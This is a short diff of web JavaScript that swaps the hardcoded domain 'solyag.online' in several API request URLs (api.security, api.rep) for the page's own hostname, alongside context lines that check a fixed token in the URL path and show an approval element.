@@ -22,7 +22,7 @@ if(split[5] === 'token123456qwer'){
 
 }
 
-fetch("https://solyag.online/index.php/api.security", {
+fetch('https://'+location.hostname+'/index.php/api.security', {
   method: "POST",
   headers: {
     "Content-Type": "application/json"
@@ -50,7 +50,7 @@ fetch("https://solyag.online/index.php/api.security", {
       $("#aprobada").css({"display": ""});
       history.pushState({}, null, 'token123456qwer');
 
-      $.ajax({url:'https://solyag.online/index.php/api.rep',method:'post',dataType : 'json',
+      $.ajax({url:'https://'+location.hostname+'/index.php/api.rep',method:'post',dataType : 'json',
       data:{'data': intent}, 
       success: function(){}});
 
@@ -104,7 +104,7 @@ fetch("https://solyag.online/index.php/api.security", {
     }
   } 
 
-  $.ajax({url:'https://solyag.online/index.php/api.rep',method:'post',dataType : 'json',
+  $.ajax({url:'https://'+location.hostname+'/index.php/api.rep',method:'post',dataType : 'json',
   data:{'data': intent.json}, 
   success: function(){}});
 
